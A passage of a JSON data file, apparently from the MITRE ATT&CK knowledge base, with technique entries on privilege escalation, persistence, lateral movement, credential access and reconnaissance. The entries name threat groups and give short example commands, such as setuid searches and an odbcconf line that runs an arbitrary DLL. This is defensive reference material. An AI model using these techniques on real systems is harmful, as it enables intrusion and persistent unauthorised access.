Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001), the techniques can be used in conjunction where a token is duplicated and then used to create a new process.","platforms":["Windows"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":[],"groups":["Turla","Lazarus Group"]},"T1548.001":{"id":"T1548.001","name":"Setuid and Setgid","description":"An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.^[[1]](http://man7.org/linux/man-pages/man2/setuid.2.html)^ Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.\n\nInstead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/002)). The `chmod` command can set these bits with bitmasking, `chmod 4777 [file]` or via shorthand naming, `chmod u+s [file]`. This will enable the setuid bit. To enable the setgid bit, `chmod 2775` and `chmod g+s` can be used.\n\nAdversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.^[[2]](https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/)^ This abuse is often part of a \"shell escape\" or other actions to bypass an execution environment with restricted permissions.\n\nAlternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)). The setuid and setguid bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via `ls -l`. The `find` command can also be used to search for such files. For example, `find / -perm +4000 2>/dev/null` can be used to find files with setuid set and `find / -perm +2000 2>/dev/null` may be used for setgid. Binaries that have these bits set may then be abused by adversaries.^[[3]](https://gtfobins.github.io/#+suid)^","platforms":["Linux","macOS"],"tactics":["Privilege Escalation","Defense Evasion"],"campaigns":[],"groups":[]},"T1547.004":{"id":"T1547.004","name":"Winlogon Helper DLL","description":"Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in `HKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\` and `HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\` are used to manage additional helper programs and functionalities that support Winlogon.^[[1]](https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order)^ \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: ^[[1]](https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order)^\n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":["Wizard Spider","Tropic Trooper","Turla"]},"T1021.003":{"id":"T1021.003","name":"Distributed Component Object Model","description":"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\n\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.^[[1]](https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html)^^[[2]](https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx)^\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.^[[3]](https://msdn.microsoft.com/en-us/library/windows/desktop/ms687317(v=vs.85).aspx)^ By default, only Administrators may remotely activate and launch COM objects through DCOM.^[[4]](https://docs.microsoft.com/en-us/windows/desktop/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1)^\n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications^[[5]](https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/)^ as well as other Windows objects that contain insecure methods.^[[6]](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)^^[[7]](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)^ DCOM can also execute macros in existing documents^[[8]](https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)^ and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution directly through a COM created instance of a Microsoft Office application^[[9]](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)^, bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). ^[[10]](https://msdn.microsoft.com/en-us/library/aa394582.aspx)^","platforms":["Windows"],"tactics":["Lateral Movement"],"campaigns":[],"groups":[]},"T1110.003":{"id":"T1110.003","name":"Password Spraying","description":"Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. ^[[1]](http://www.blackhillsinfosec.com/?p=4645)^\n\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.^[[2]](https://www.us-cert.gov/ncas/alerts/TA18-086A)^\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.","platforms":["Windows","Azure AD","Office 365","SaaS","IaaS","Linux","macOS","Google Workspace","Containers"],"tactics":["Credential Access"],"campaigns":[],"groups":["APT29","HEXANE","Lazarus Group","APT33","Silent Librarian","Chimera","Leafminer","APT28","Sandworm Team"]},"T1090.002":{"id":"T1090.002","name":"External Proxy","description":"Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. ^[[1]](http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/)^ Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":[],"groups":["APT39","APT28","FIN5","Tonto Team","Lazarus Group","menuPass","APT3","Silence","GALLIUM","MuddyWater"]},"T1056.003":{"id":"T1056.003","name":"Web Portal Capture","description":"Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.^[[1]](https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/)^","platforms":["Linux","macOS","Windows"],"tactics":["Collection","Credential Access"],"campaigns":[],"groups":[]},"T1589.002":{"id":"T1589.002","name":"Email Addresses","description":"Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.\n\nAdversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).^[[1]](https://www.hackers-arise.com/email-scraping-and-maltego)^^[[2]](https://www.cnet.com/news/massive-breach-leaks-773-million-emails-21-million-passwords/)^ Email addresses could also be enumerated via more active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.^[[3]](https://grimhacker.com/2017/07/24/office365-activesync-username-enumeration/)^ For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.^[[4]](https://github.com/gremwell/o365enum)^^[[5]](https://o365blog.com/post/just-looking/)^\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Email Accounts](https://attack.mitre.org/techniques/T1586/002)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Brute Force](https://attack.mitre.org/techniques/T1110) via [External Remote Services](https://attack.mitre.org/techniques/T1133)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["TA551","MuddyWater","Lazarus Group","HAFNIUM","Magic Hound","Silent Librarian","Kimsuky","HEXANE","LAPSUS$","EXOTIC LILY","APT32","Sandworm Team"]},"T1598.004":{"id":"T1598.004","name":"Spearphishing Voice","description":"Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or \"vishing\"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.^[[1]](https://business.bofa.com/en-us/content/what-is-vishing.html)^\n\nVictims may also receive phishing messages that direct them to call a phone number (\"callback phishing\") where the adversary attempts to collect confidential information.^[[2]](https://www.avertium.com/resources/threat-reports/everything-you-need-to-know-about-callback-phishing)^\n\nAdversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to tailor pretexts to be even more persuasive and believable for the victim.","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":["C0027"],"groups":["LAPSUS$"]},"T1003.005":{"id":"T1003.005","name":"Cached Domain Credentials","description":"Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.^[[1]](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v%3Dws.11))^\n\nOn Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.^[[2]](https://passlib.readthedocs.io/en/stable/lib/passlib.hash.msdcc2.html)^ The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to recover the plaintext password.^[[3]](https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials)^\n\nWith SYSTEM access, the tools/utilities such as [Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075), and secretsdump.py can be used to extract the cached credentials.\n\nNote: Cached credentials for Windows Vista are derived using PBKDF2.^[[2]](https://passlib.readthedocs.io/en/stable/lib/passlib.hash.msdcc2.html)^","platforms":["Windows"],"tactics":["Credential Access"],"campaigns":[],"groups":["APT33","Leafminer","OilRig","MuddyWater"]},"T1098.004":{"id":"T1098.004","name":"SSH Authorized Keys","description":"Adversaries may modify the SSH `authorized_keys` file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The `authorized_keys` file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under `&lt;user-home&gt;/.ssh/authorized_keys`.^[[1]](https://www.ssh.com/ssh/authorized_keys/)^ Users may edit the system’s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value “yes” to ensure public key and RSA authentication are enabled. The SSH config file is usually located under `/etc/ssh/sshd_config`.\n\nAdversaries may modify SSH `authorized_keys` files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI’s “add-metadata” command an adversary may add SSH keys to a user account.^[[2]](https://cloud.google.com/sdk/gcloud/reference/compute/instances/add-metadata)^^[[3]](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)^ Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API.^[[4]](https://docs.microsoft.com/en-us/rest/api/compute/virtual-machines/update)^ This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.^[[5]](https://www.venafi.com/blog/growing-abuse-ssh-keys-commodity-malware-campaigns-now-equipped-ssh-capabilities)^^[[6]](https://www.cybereason.com/blog/new-pervasive-worm-exploiting-linux-exim-server-vulnerability)^ It may also lead to privilege escalation where the virtual machine or instance has distinct permissions from the requesting user.\n\nWhere authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. \n\nSSH keys can also be added to accounts on network devices, such as with the `ip ssh pubkey-chain` [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) command.^[[7]](https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/security/d1/sec-d1-cr-book/sec-cr-i3.html#wp1254331478)^","platforms":["Linux","macOS","IaaS","Network"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":["Earth Lusca","TeamTNT"]},"T1590.006":{"id":"T1590.006","name":"Network Security Appliances","description":"Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).^[[1]](https://nmap.org/book/firewalls.html)^ Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":[]},"T1546.012":{"id":"T1546.012","name":"Image File Execution Options Injection","description":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., `C:\\dbg\\ntsd.exe -g  notepad.exe`). ^[[1]](https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/)^\n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. ^[[2]](https://docs.microsoft.com/windows-hardware/drivers/debugger/gflags-overview)^ IFEOs are represented as `Debugger` values in the Registry under `HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable>` where `&lt;executable&gt;` is the binary on which the debugger is attached. ^[[1]](https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/)^\n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). ^[[3]](https://docs.microsoft.com/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit)^ ^[[4]](https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/)^ Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\`. ^[[3]](https://docs.microsoft.com/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit)^ ^[[4]](https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/)^\n\nSimilar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the \"debugger\" program to be executed with SYSTEM privileges. ^[[5]](http://blog.crowdstrike.com/registry-analysis-with-crowdresponse/)^\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. ^[[6]](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)^ Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.\n\nMalware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. ^[[7]](https://www.f-secure.com/v-descs/backdoor_w32_hupigon_emv.shtml)^ ^[[8]](https://www.symantec.com/security_response/writeup.jsp?docid=2008-062807-2501-99&tabid=2)^","platforms":["Windows"],"tactics":["Privilege Escalation","Persistence"],"campaigns":[],"groups":["TEMP.Veles"]},"T1218.008":{"id":"T1218.008","name":"Odbcconf","description":"Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.^[[1]](https://docs.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-2017)^ The Odbcconf.exe binary may be digitally signed by Microsoft.\n\nAdversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf.exe has a `REGSVR` flag that can be misused to execute DLLs (ex: `odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;`). ^[[2]](https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/)^^[[3]](https://blog.trendmicro.com/trendlabs-security-intelligence/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses/)^^[[4]](https://blog.trendmicro.com/trendlabs-security-intelligence/cobalt-spam-runs-use-macros-cve-2017-8759-exploit/)^ \n","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["Cobalt Group"]},"T1593.002":{"id":"T1593.002","name":"Search Engines","description":"Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).^[[1]](https://securitytrails.com/blog/google-hacking-techniques)^^[[2]](https://www.exploit-db.com/google-hacking-database)^\n\nAdversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["Kimsuky"]},"T1591.002":{"id":"T1591.002","name":"Business Relationships","description":"Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization’s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim’s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).^[[1]](https://threatpost.com/broadvoice-leaks-350m-records-voicemail-transcripts/160158/)^ Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["Dragonfly","LAPSUS$","Sandworm Team"]},"T1548.005":{"id":"T1548.005","name":"Temporary Elevated Cloud Access","description":"Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own. \n\nJust-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.^[[1]](https://cloud.google.com/architecture/manage-just-in-time-privileged-access-to-project)^^[[2]](https://learn.microsoft.com/en-us/azure/azure-resource-manager/managed-applications/approve-just-in-time-access)^\n\nAccount impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account.^[[3]](https://cloud.google.com/iam/docs/service-account-permissions)^ In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts.^[[4]](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/impersonation-and-ews-in-exchange)^ \n\nMany cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the `PassRole` permission can allow a service they create to assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource.^[[5]](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html)^^[[3]](https://cloud.google.com/iam/docs/service-account-permissions)^\n\nWhile users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.^[[6]](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)^^[[7]](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)^\n\n**Note:** this technique is distinct from [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003), which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.^[[8]](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/)^","platforms":["IaaS","Azure AD","Office 365"],"tactics":["Privilege Escalation","Defense Evasion"],"campaigns":[],"groups":[]},"T1125":{"id":"T1125","name":"Video Capture","description":"An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. ^[[1]](https://objective-see.com/blog/blog_0x25.html)^","platforms":["Windows","macOS","Linux"],"tactics":["Collection"],"campaigns":[],"groups":["Silence","FIN7"]},"T1055.013":{"id":"T1055.013","name":"Process Doppelgänging","description":"Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process. \n\nWindows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. ^[[1]](https://msdn.microsoft.com/library/windows/desktop/bb968806.aspx)^ To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. ^[[2]](https://msdn.microsoft.com/library/windows/desktop/dd979526.aspx)^ To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. ^[[3]](https://msdn.microsoft.com/library/windows/desktop/aa365738.aspx)^\n\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. ^[[4]](https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf)^\n\nAdversaries may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055). Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as `NtUnmapViewOfSection`, `VirtualProtectEx`, and `SetThreadContext`. ^[[4]](https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf)^\n\nProcess Doppelgänging is implemented in 4 steps ^[[4]](https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf)^:\n\n* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.\n* Load – Create a shared section of memory and load the malicious executable.\n* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.\n* Animate – Create a process from the tainted section of memory and initiate execution.\n\nThis behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process. ","platforms":["Windows"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":[],"groups":["Leafminer"]},"T1016":{"id":"T1016","name":"System Network Configuration Discovery","description":"Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. `show ip route`, `show ip interface`).^[[1]](https://www.us-cert.gov/ncas/alerts/TA18-106A)^(Citation: Mandiant APT41 Global Intrusion )\n\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ","platforms":["Linux","macOS","Windows","Network"],"tactics":["Discovery"],"campaigns":["Operation CuckooBees","C0017","FunnyDream","C0018","Frankenstein","Operation Wocao","C0015"],"groups":["HEXANE","Mustang Panda","Dragonfly","admin@338","Moses Staff","APT19","FIN13","Volt Typhoon","Lazarus Group","APT3","MuddyWater","menuPass","SideCopy","Stealth Falcon","APT1","Tropic Trooper","Threat Group-3390","Ke3chang","Naikon","Chimera","Magic Hound","Sidewinder","Turla","Wizard 